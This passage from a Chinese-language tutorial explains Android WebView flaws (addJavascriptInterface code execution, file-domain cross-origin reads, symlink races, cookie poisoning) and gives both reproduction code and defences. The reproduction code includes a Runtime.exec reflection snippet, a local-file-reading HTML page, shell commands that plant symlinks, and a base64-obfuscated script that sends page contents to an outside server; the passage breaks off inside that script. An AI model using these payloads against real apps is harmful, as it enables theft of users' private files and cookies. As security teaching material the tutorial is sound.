alt=\"image-20220729152654652\"></p>\n<p>下面我们就将一一的讲解每个漏洞的原理并进行复现</p>\n<h2 id=\"四、WebView的漏洞原理和复现\"><a href=\"#四、WebView的漏洞原理和复现\" class=\"headerlink\" title=\"四、WebView的漏洞原理和复现\"></a>四、WebView的漏洞原理和复现</h2><h3 id=\"1-历史漏洞\"><a href=\"#1-历史漏洞\" class=\"headerlink\" title=\"1.历史漏洞\"></a>1.历史漏洞</h3><h4 id=\"（1）WebView任意代码执行漏洞\"><a href=\"#（1）WebView任意代码执行漏洞\" class=\"headerlink\" title=\"（1）WebView任意代码执行漏洞\"></a>（1）WebView任意代码执行漏洞</h4><h5 id=\"lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞\"><a href=\"#lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞\" class=\"headerlink\" title=\"&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞\"></a>&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p>\n<p>我们在上文中讲述过JS和Android直接的通信可以通过<code>addJavascriptInterface</code>接口进行对象映射</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webView.addJavascriptInterface(<span class=\"keyword\">new</span> <span class=\"title class_\">JSObject</span>(), <span class=\"string\">&quot;myObj&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">// 参数1：Android的本地对象</span></span><br><span class=\"line\"><span class=\"comment\">// 参数2：JS的对象</span></span><br><span class=\"line\"><span class=\"comment\">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure>\n\n<p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p>\n<p>具体的攻击步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）Android中的对象有一公共的方法：getClass() </span><br><span class=\"line\">（<span class=\"number\">2</span>）该方法可以获取到当前类 类型Class</span><br><span class=\"line\">（<span class=\"number\">3</span>）该类有一关键的方法： Class.forName；</span><br><span class=\"line\">（<span class=\"number\">4</span>）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class=\"line\">（<span class=\"number\">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure>\n\n<p>示例代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">execute</span><span class=\"params\">(cmdArgs)</span>  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"comment\">// 步骤1：遍历 window 对象</span></span><br><span class=\"line\">    <span class=\"comment\">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class=\"line\">    <span class=\"comment\">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> obj in window) &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&quot;getClass&quot;</span> in window[obj]) &#123;  </span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class=\"line\">            alert(obj);          </span><br><span class=\"line\">            <span class=\"keyword\">return</span>  window[obj].getClass().forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class=\"line\">getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>).invoke(<span class=\"literal\">null</span>,<span class=\"literal\">null</span>).exec(cmdArgs);  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class=\"line\"><span class=\"comment\">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure>\n\n<p><strong>漏洞防护：</strong></p>\n<p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用，如我们上文中实现的便是如此</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/30.png\" alt=\"image-20220729164533455\"></p>\n<p>后来这种漏洞越来越少，在当前高版本的手机上基本没有了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/31.png\" alt=\"image-20220729164656332\"></p>\n<p>在4.2之前，可以采用拦截prompt（）的方式进行漏洞修复，不过这种版本太过久远，所以我们这里就不细讲了</p>\n<h5 id=\"lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞\"><a href=\"#lt-2-gt-searchBoxJavaBridge-接口引起远程代码执行漏洞\" class=\"headerlink\" title=\"&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞\"></a>&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p>\n<p>在Android 3.0以下，Android系统会默认通过<code>searchBoxJavaBridge_</code>的Js接口给 WebView 添加一个JS映射对象：<code>searchBoxJavaBridge_</code>对象，该接口可能被利用，实现远程任意代码。</p>\n<p><strong>安全防护：</strong></p>\n<p>删除<code>searchBoxJavaBridge_</code>接口</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过调用该方法删除接口</span></span><br><span class=\"line\">removeJavascriptInterface（）;</span><br></pre></td></tr></table></figure>\n\n<p>而<code>accessibility</code>和 <code>accessibilityTraversal</code>接口引起远程代码执行漏洞的原理和这里相似，由于这些漏洞在当前的Android版本上基本不存在，我们不做深入讲解了。</p>\n<h4 id=\"（2）WebView明文存储漏洞\"><a href=\"#（2）WebView明文存储漏洞\" class=\"headerlink\" title=\"（2）WebView明文存储漏洞\"></a>（2）WebView明文存储漏洞</h4><p><strong>漏洞原理：</strong></p>\n<p>WebView默认开启密码保存功能 ：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mWebView.setSavePassword(<span class=\"literal\">true</span>)`</span><br></pre></td></tr></table></figure>\n\n<p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p>\n<p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p>\n<p><strong>安全防护：</strong></p>\n<p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p>\n<h3 id=\"2-跨域漏洞\"><a href=\"#2-跨域漏洞\" class=\"headerlink\" title=\"2.跨域漏洞\"></a>2.跨域漏洞</h3><p>2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)，漏洞产生的原因在Android系统中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。</p>\n<p>针对WebView的跨域问题，主要是三个重要的API，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th><strong>方法</strong></th>\n<th><strong>作用&#x2F;风险</strong></th>\n<th><strong>默认策略</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>setAllowFileAccess(true);</td>\n<td>设置是否允许 WebView 使用 File 协议</td>\n<td>默认设置为 true</td>\n</tr>\n<tr>\n<td>setAllowFileAccessFromFileURLs(true);</td>\n<td>设置是否允许通过 file url 加载的 Js 代码读取其他的本地文件</td>\n<td>在 Android 4.1 后默认禁止</td>\n</tr>\n<tr>\n<td>setAllowUniversalAccessFromFileURLs(true);</td>\n<td>设置是否允许通过 file url 加载的 Javascript 可以访问其他的源 (包括http、https等源)</td>\n<td>在 Android 4.1 后默认禁止</td>\n</tr>\n<tr>\n<td>setJavaScriptEnabled(true);</td>\n<td>设置是否允许 WebView 使用 JavaScript</td>\n<td>默认不允许</td>\n</tr>\n</tbody></table>\n<h4 id=\"（1）任意文件窃取1（应用克隆漏洞）\"><a href=\"#（1）任意文件窃取1（应用克隆漏洞）\" class=\"headerlink\" title=\"（1）任意文件窃取1（应用克隆漏洞）\"></a>（1）任意文件窃取1（应用克隆漏洞）</h4><p><strong>漏洞原理：</strong></p>\n<p><code>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</code></p>\n<p>这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML&#x2F;JS，并窃取相关的私有文件信息</p>\n<p><strong>漏洞复现：</strong></p>\n<p>首先我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/37.png\" alt=\"image-20220729195648955\"></p>\n<p>我们怎么利用WebView的跨域漏洞去访问本地的私有目录</p>\n<p>首先我们编写目标JS文件：</p>\n<p>fileAttack.html</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">function <span class=\"title function_\">loadXMLDoc</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">var</span> <span class=\"variable\">arm</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;file:///etc/hosts&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> xmlhttp;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (window.XMLHttpRequest)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        xmlhttp=<span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    xmlhttp.onreadystatechange=function()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (xmlhttp.readyState==<span class=\"number\">4</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">              console.log(xmlhttp.responseText);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    xmlhttp.open(<span class=\"string\">&quot;GET&quot;</span>,arm);</span><br><span class=\"line\">    xmlhttp.send(<span class=\"literal\">null</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">loadXMLDoc();</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后我们将文件上传到手机的目录</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/38.png\" alt=\"image-20220729200249055\"></p>\n<p>接着我们编写攻击脚本</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">  <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">      setContentView(R.layout.activity_file_web_view);</span><br><span class=\"line\">      <span class=\"type\">WebView</span> <span class=\"variable\">webView</span> <span class=\"operator\">=</span> findViewById(R.id.Wind_webview0);</span><br><span class=\"line\">      <span class=\"comment\">//设置是否允许 WebView 使用 File 协议</span></span><br><span class=\"line\">      webView.getSettings().setAllowFileAccess(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class=\"line\">      webView.getSettings().setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      webView.loadUrl(<span class=\"string\">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是程序肯定会报错误，因为Android4.1后就默认禁止<code>setAllowFileAccessFromFileURLs(true)</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/39.png\" alt=\"image-20220729200625192\"></p>\n<p>然后我们开启<code>setAllowFileAccessFromFileURLs</code>按钮，再次执行</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/40.png\" alt=\"image-20220729200745980\"></p>\n<p>我们可以发现现在的Android版本中开始删除了这样的API，这是为了安全性，不过这里我们还是可以使用，于是我们开启API</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/41.png\" alt=\"image-20220729201027637\"></p>\n<p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p>\n<h4 id=\"（2）通用协议漏洞-（恶意页面注入）\"><a href=\"#（2）通用协议漏洞-（恶意页面注入）\" class=\"headerlink\" title=\"（2）通用协议漏洞 （恶意页面注入）\"></a>（2）通用协议漏洞 （恶意页面注入）</h4><p><strong>漏洞原理：</strong></p>\n<p><code>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</code></p>\n<p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p>\n<p>我们将上面html中的访问改为看雪的网站：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">loadXMLDoc</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> arm = <span class=\"string\">&quot;https://bbs.pediy.com/&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> xmlhttp;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">window</span>.<span class=\"property\">XMLHttpRequest</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        xmlhttp=<span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    xmlhttp.<span class=\"property\">onreadystatechange</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"comment\">//alert(&quot;status is&quot;+xmlhttp.status);</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">if</span> (xmlhttp.<span class=\"property\">readyState</span>==<span class=\"number\">4</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">              <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(xmlhttp.<span class=\"property\">responseText</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    xmlhttp.<span class=\"title function_\">open</span>(<span class=\"string\">&quot;GET&quot;</span>,arm);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    xmlhttp.<span class=\"title function_\">send</span>(<span class=\"literal\">null</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">loadXMLDoc</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/42.png\" alt=\"image-20220729202020754\"></p>\n<p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p>\n<p><strong>安全防护:</strong></p>\n<ul>\n<li>检查应用是否使用了 webview 控件；</li>\n<li>避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；</li>\n<li>file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li>\n</ul>\n<p>若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：</p>\n<ul>\n<li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:&#x2F;&#x2F;&#x2F;android_asset 和 file:&#x2F;&#x2F;&#x2F;android_res 在不开启 API 的情况下也可以访问；</li>\n<li>可能会更新的 HTML 文件放在 &#x2F;data&#x2F;data&#x2F;(app) 目录下，避免被第三方替换或修改；</li>\n<li>对 file 域请求做白名单限制时，需要对“…&#x2F;…&#x2F;”特殊情况进行处理，避免白名单被绕过。</li>\n</ul>\n<h4 id=\"（3）符号链接跨源攻击\"><a href=\"#（3）符号链接跨源攻击\" class=\"headerlink\" title=\"（3）符号链接跨源攻击\"></a>（3）符号链接跨源攻击</h4><p>我们回顾2020SDC中研究提到的这类漏洞，只有<strong>setAllowFileAccess为True</strong></p>\n<p><strong>漏洞原理：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/43.png\" alt=\"image-20220729202532795\"></p>\n<p>其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。</p>\n<p>具体攻击步骤:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（在该命令执行前 xx.html 是不存在的；执行完这条命令之后，就生成了这个文件，并且将 Cookie 文件链接到了 xx.html 上。）</span><br><span class=\"line\"><span class=\"number\">1.</span> 把恶意的 js 代码输出到攻击应用的目录下，随机命名为 xx.html，修改该目录的权限；\\</span><br><span class=\"line\"><span class=\"number\">2.</span> 修改后休眠 1s，让文件操作完成；\\</span><br><span class=\"line\"><span class=\"number\">3.</span> 完成后通过系统的 Chrome 应用去打开该 xx.html 文件\\</span><br><span class=\"line\"><span class=\"number\">4.</span> 等待 4s 让 Chrome 加载完成该 html，最后将该 html 删除，并且使用 ln -s 命令为 Chrome 的 Cookie 文件创建软连接，\\</span><br><span class=\"line\">于是就可通过链接来访问 Chrome 的 Cookie</span><br></pre></td></tr></table></figure>\n\n<p><strong>漏洞复现：</strong></p>\n<p>这里由于该漏洞在Android7.0版本上已经修复了，所以这里我引用大佬的博客来进行描述，大家具体可以按照步骤在Android7.0以下的版本上去复现，参考文章：<a href=\"https://blog.csdn.net/qq_35993502/article/details/121371049\">Android安全检测－WebView File域同源策略绕过漏洞</a></p>\n<p>构造HTML文件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">#恶意<span class=\"variable constant_\">APP</span>的<span class=\"variable constant_\">HTML</span>,被检测<span class=\"variable constant_\">APP</span>加载此html，执行<span class=\"variable constant_\">JS</span>代码</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">var d = document;</span></span><br><span class=\"line\"><span class=\"language-xml\">function loadDatabase()</span></span><br><span class=\"line\"><span class=\"language-xml\">&#123;</span></span><br><span class=\"line\"><span class=\"language-xml\">    var file_url = d.URL;</span></span><br><span class=\"line\"><span class=\"language-xml\">    var xmlhttp =new XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"language-xml\">    xmlhttp.onload=function() &#123;</span></span><br><span class=\"line\"><span class=\"language-xml\"> \t\tdocument.body.appendChild(d.createTextNode(xmlhttp.responseText))</span></span><br><span class=\"line\"><span class=\"language-xml\">    \talert(xmlhttp.responseText);</span></span><br><span class=\"line\"><span class=\"language-xml\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-xml\">    xmlhttp.open(&quot;GET&quot;,file_url);</span></span><br><span class=\"line\"><span class=\"language-xml\">    xmlhttp.send(null);</span></span><br><span class=\"line\"><span class=\"language-xml\">&#125;</span></span><br><span class=\"line\"><span class=\"language-xml\">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>构造恶意APP的攻击代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#恶意APP的攻击代码</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123; </span><br><span class=\"line\">  \t\t<span class=\"type\">String</span> <span class=\"variable\">HTML</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class=\"line\">  \t\t#新建文件夹，用于存放恶意HTML文件</span><br><span class=\"line\">       \tcmdexec(<span class=\"string\">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class=\"line\">       \t#将恶意HTML到恶意APP的沙盒目录</span><br><span class=\"line\">        cmdexec(<span class=\"string\">&quot;echo \\&quot;&quot;</span> + HTML + <span class=\"string\">&quot;\\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class=\"line\">        #授权目录及其文件权限，允许其它应用访问</span><br><span class=\"line\">        cmdexec(<span class=\"string\">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">        #启动被攻击的APP，并携带恶意HTML</span><br><span class=\"line\">        <span class=\"title function_\">invokeVulnAPP</span><span class=\"params\">(<span class=\"string\">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class=\"line\">        #延时<span class=\"number\">6</span>秒</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">6000</span>);</span><br><span class=\"line\">        #删除HTML文件</span><br><span class=\"line\">        cmdexec(<span class=\"string\">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class=\"line\">        #软链接文件，实现读取被攻击应用的<span class=\"keyword\">private</span>.txt文件</span><br><span class=\"line\">        cmdexec(<span class=\"string\">&quot;ln -s &quot;</span> + <span class=\"string\">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class=\"string\">&quot; &quot;</span> + HTML_PATH);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// <span class=\"doctag\">TODO:</span> handle exception</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>目标样本：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#被攻击的APP，有漏洞的代码</span><br><span class=\"line\"><span class=\"type\">WebView</span> <span class=\"variable\">webView</span> <span class=\"operator\">=</span> findViewById(R.id.webview);</span><br><span class=\"line\">webView.getSettings().setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\">webView.getSettings().setAllowFileAccess(<span class=\"literal\">true</span>);  允许加载File域</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> getIntent();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (i != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">     mUri = i.getData(); #取出了恶意HTML</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (mUri != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    url = mUri.toString();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (url != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实现效果：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png\" alt=\"image-20220729205923022\"></p>\n<p><strong>安全防护：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、设置setAllowFileAccess方法为<span class=\"literal\">false</span>,设置setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs为<span class=\"literal\">false</span>。</span><br><span class=\"line\"><span class=\"number\">2</span>、在Android4<span class=\"number\">.0</span>(API15)及以下得采用其他方法进行手动校验是否访问file域</span><br><span class=\"line\"><span class=\"number\">3</span>、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）污染Cooike漏洞\"><a href=\"#（4）污染Cooike漏洞\" class=\"headerlink\" title=\"（4）污染Cooike漏洞\"></a>（4）污染Cooike漏洞</h4><p>本漏洞参考：<a href=\"http://www.ctfiot.com/39656.html\">Android-Webview中的漏洞利用总结</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/44.png\" alt=\"image-20220729210229976\"></p>\n<p><strong>漏洞原理：</strong></p>\n<p>攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike，如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/74.png\" alt=\"image-20220730141203355\"></p>\n<p><strong>漏洞复现：</strong></p>\n<p>首先创建了符号链接，然后过URL校验，访问我们的服务器<code>http://ip地址/easydroid.html</code>:</p>\n<p>建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件</p>\n<p><code>easydroid.html</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>evil<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>injected cookie with xss<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span> = <span class=\"string\">&quot;sendData = &#x27;&lt;img src=\\&quot;evil\\&quot; onerror=\\&quot;eval(atob(&#x27;dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw==&#x27;))\\&quot;&gt;&#x27;&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> baseUrl = <span class=\"string\">&quot;http://****/MyTest/ReceiveServlet?&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Image</span>().<span class=\"property\">src</span> = baseUrl + <span class=\"string\">&quot;cookie=&quot;</span> + <span class=\"built_in\">encodeURIComponent</span>(<span class=\"string\">&quot;open evil page.&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">     <span class=\"built_in\">setTimeout</span>(<span 